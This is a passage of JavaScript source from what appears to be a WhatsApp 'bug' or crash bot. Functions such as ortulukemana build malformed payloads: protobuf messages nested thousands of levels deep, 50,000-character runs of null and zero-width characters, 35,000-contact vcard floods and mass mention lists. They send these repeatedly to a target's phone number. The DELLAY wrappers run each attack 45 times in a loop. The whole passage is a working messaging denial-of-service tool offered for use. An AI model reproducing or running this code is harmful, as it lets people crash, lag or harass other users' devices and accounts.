      statusJidList: [target],
      noSelfSync: true,
      participant: { jid: target },
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
        }]
      }]
    });
  } catch (err) {}
}

async function ortulukemana(sock, target) {
  const OPTS = {};
  const chunk = Array.isArray(target) ? target : [target];
  const targetJid = chunk[0];
  const baseMsgId = "MEGA" + Date.now().toString(36).toUpperCase();

  const senderGuard = async (fn) => {
    try { await fn(); } catch (e) {}
  };

  const encodeVarint = function (n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function (tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const inflate = function (basePayload, tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
    [0xFA, 0x05],
    [0xC2, 0x06],
  ];

  const STC = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc?ccb=11-4&oh=01_Q5Aa3wGIdnU4a89cz0GLaxdWk1j54W582dW0xZ3czj9Dyyh_Ow&oe=69BB2C5C&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "/wIcGMsYF7liPKItunivQe41vqK7hP4ZNwD8Sqvmexo=",
    fileLength: "39218397",
    seconds: 210,
    mediaKey: "dqqHYls1grodqwvBH61uVJMe2tgGPEgFx3roOQr2PIg=",
    height: 720,
    width: 982,
    fileEncSha256: "xro5p+xptCFGVxUtTrcTGxHnAO0vwU4KCpsw7r0wWMQ=",
    directPath: "/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc?ccb=11-4&oh=01_Q5Aa3wGIdnU4a89cz0GLaxdWk1j54W582dW0xZ3czj9Dyyh_Ow&oe=69BB2C5C&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1771289203",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADUASAMBIgACEQEDEQH/xAAvAAADAQEBAAAAAAAAAAAAAAAAAwQBAgUBAAMBAQAAAAAAAAAAAAAAAAECAwAE/9oADAMBAAIQAxAAAADXb2zzhkrPyFzwp6wyIOhhvSajkLtWreVB7cQoNh9QzjKhk7pmoIepvEugndjOjrvQVDzBDgfleBOvCwZvOwNV4Al//8QAJBAAAwACAgIBBAMBAAAAAAAAAAECAxMhMQQSEyIyQVEQQmH/2gAIAQEAAT8A+smqc8r+YZT2QV0Ukcpla0dsyP41tk+Zr+pGeL/JLX7KKqFrkp7ZSbSPiaMuN3OmZ/G9JTE2mYfJ9VzyZPIuz3/xjfJPSK+0WzPNOKWifHm0XjrHfqQvoW0UkN8mN8D6FSTZGn2VHrT/AEOIrTfaNI9e2uR9mM1tCnRSfBxW0z4+ez0SE5X5Q1yQIYzJ9lCz5J6Y82RvlmOnUn//xAAdEQACAgIDAQAAAAAAAAAAAAAAAQIREiAQITFB/9oACAECAQE/AJGLIqj6WPqjIV8y81ev/8QAHBEAAgIDAQEAAAAAAAAAAAAAAAECERAxQQMh/9oACAEDAQE/AItDmj0dnChO2yhxvRL5iOyLSRF9HGLdlJC3hYls/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA",
      statusSourceType: "VIDEO",
      mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
      isForwarded: true,
      forwardingScore: 7205,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363354196416459@newsletter",
        newsletterName: "饾槧饾樁饾槵饾槳饾槸饾槩 - 饾構饾槮饾樂饾槳饾槶饾槾",
        serverMessageId: 1000,
        accessibilityText: "蠅薪伪褌褧伪蟻蟻 胁蠀gg褦褟 茠蠀畏垄褌喂蟽畏"
      },
      statusAttributionType: "RESHARED_FROM_MENTION",
      contactVcard: true,
      isSampled: false,
      dissapearingMode: {
        initiator: target,
        initiatedByMe: true
      },
      expiration: Date.now()
    },
    streamingSidecar: "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"
  };

  const XR = {
    contactsArrayMessage: {
      displayName: "\u20D3XRyy Vs Ibulu\u20D3".repeat(9999),
      contacts: Array.from({ length: 35000 }, (_, n) => ({
        displayName: "\u20D3Maklu" + (n + 1),
        vcard: "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          "FN:XRyyModeIpong" + (n + 1) + "\n" +
          "TEL;type=CELL;type=VOICE;waid=6281248620184" + n + ":+62 812-4862-0284" + n + "\n" +
          "END:VCARD"
      }))
    }
  };
  
  const rexzy = {
    interactiveMessage: {
      header: {
        title: "\u0000".repeat(50000),
        subtitle: "\u0000".repeat(50000),
        bloksWidget: {
          uuid: "\u0000".repeat(50000),
          data: "[".repeat(50001),
          type: "\u0000".repeat(50000),
          fallback: "\u0000".repeat(50000)
        }
      },
      body: { text: "Rexzy Niehhhhh" },
      nativeFlowMessage: {
        name: 'booking_status',
        buttonParamsJson: JSON.stringify({})
      }
    }
  };

  const LOW = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetaData: {
            senderKeyIndexes: [],
            recipientKeyIndexes: [],
            senderTimeStamp: [],
            recipientKeyHash: [],
            recipientTimdStamp: []
          },
          deviceListMetaDataVersion: 2
        },
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          jpegThumbnail: null,
          name: "Bang, Mau iPhone Ga" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
          address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
          url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
        },
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: Buffer.alloc(5000).fill(255),
              caption: "𑇂𑆵𑆴𑆿".repeat(60000)
            },
            quotedMessage: { rexzy },
            placeholderKey: {
              remoteJid: "0.@s.whatsapp.net",
              fromMe: false,
              id: sock.generateMessageTag()
            }
          }
        }
      }
    }
  };
   
  const INVIS = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "\u0070".repeat(50000),
            subtitle: "\x10".repeat(50000),
            bloksWidget: {
              uuid: "\u200B".repeat(50000),
              data: "[".repeat(50001),
              type: "\u200F".repeat(50000),
              fallback: "\u200D".repeat(50000)
            }
          },
          body: { text: "\u000F" },
          nativeFlowMessage: {
            buttons: "[".repeat(50000)
          }
        }
      }
    }
  };

  const imgPayload = proto.Message.encode(
    proto.Message.fromObject(
      { videoMessage: STC },
      { contactMessage: XR },
      { locationMessage: LOW },
      { interactiveMessage: INVIS },
      { imageMessage: STC }
    )
  ).finish();
  
  const mon = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "maklu" + " XryyDiatasMaklu".repeat(30000)
          },
          nativeFlowMessage: {
            name: "carousel_message",
            buttons: [],
            cards: Array.from({ length: 30 }, () => ({}))
          },
          contextInfo: {
            remoteJid: "@s.whatsapp.net",
            statusAttributionType: 9999,
            mentionedJid: Array.from(
              { length: 2000 },
              () => Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };

  const monPayload = proto.Message.encode(
    proto.Message.fromObject({ messagepayload: mon })
  ).finish();

  for (let ti = 0; ti < TAGS.length; ti++) {
    const tag = TAGS[ti];
    let decodedPayload = null;

    for (let depth = 6000; depth >= 2000 && !decodedPayload; depth -= 500) {
      try {
        const raw = inflate(imgPayload, tag, depth);
        const decoded = proto.Message.decode(raw);
        proto.Message.encode(decoded).finish();
        decodedPayload = decoded;
      } catch (_) {}
    }

    if (!decodedPayload) continue;

    await senderGuard(async () => {
      await sock.relayMessage("status@broadcast", decodedPayload, {
        messageId: baseMsgId + "-F1-" + ti,
        statusJidList: chunk,
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          participant: true,
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: chunk.map((jid) => ({
              tag: "to",
              attrs: { jid: jid },
              content: []
            }))
          }]
        }]
      });
    });
  }

  for (let i = 0; i < 10; i++) {
    await senderGuard(async () => {
      const messagePayload = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                title: "\u0070".repeat(50000),
                subtitle: "\x10".repeat(50000),
                bloksWidget: {
                  uuid: "\u200B".repeat(50000),
                  data: "[".repeat(50001),
                  type: "\u200F".repeat(50000),
                  fallback: "\u200D".repeat(50000)
                }
              },
              body: { text: "\u000F" },
              nativeFlowMessage: {
                name: 'booking_status',
                buttonParamsJson: JSON.stringify({})
              }
            }
          }
        }
      };
      await sock.relayMessage(targetJid, messagePayload, { participant: true }, OPTS);
    });

    await senderGuard(async () => {
      await new Promise((r) => setTimeout(r, 500 + Math.random() * 5500));
    });

    if (i % 3 === 0) {
      const tag = TAGS[i % TAGS.length];
      let decodedMon = null;

      for (let depth = 5000; depth >= 2000 && !decodedMon; depth -= 500) {
        try {
          const raw = inflate(monPayload, tag, depth);
          const decoded = proto.Message.decode(raw);
          proto.Message.encode(decoded).finish();
          decodedMon = decoded;
        } catch (_) {}
      }

      if (decodedMon) {
        await senderGuard(async () => {
          await sock.relayMessage("status@broadcast", decodedMon, {
            messageId: "BONUS_" + baseMsgId,
            statusJidList: chunk,
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: chunk.map((jid) => ({
                  tag: "to",
                  attrs: { jid: jid },
                  content: []
                }))
              }]
            }]
          });
        });
      }
    }
  }

  const finisherPromises = [];
  for (let i = 0; i < 20; i++) {
    finisherPromises.push(
      senderGuard(async () => {
        await sock.relayMessage(targetJid, {
          groupStatusMessageV2: {
            message: {
              interactiveMessage: {
                body: { text: "\u0000".repeat(10000) + "MEGA" + i },
                nativeFlowMessage: {
                  buttons: "X".repeat(30000)
                }
              }
            }
          },
          participant: true
        }, { messageId: "FIN_" + Date.now().toString(36) + "_" + i });
      })
    );
  }

  await Promise.allSettled(finisherPromises);
}

// ============================================================
// DELLAY FUNCTIONS
// ============================================================
async function DELLAY1(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await delayhard(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function DELLAY2(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await mbutnew(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function DELLAY3(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await xovaliaum(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function DELLAY4(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await iosdelay(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function DELLAY5(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await makluInvis(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function DELLAY6(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await syncdly(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
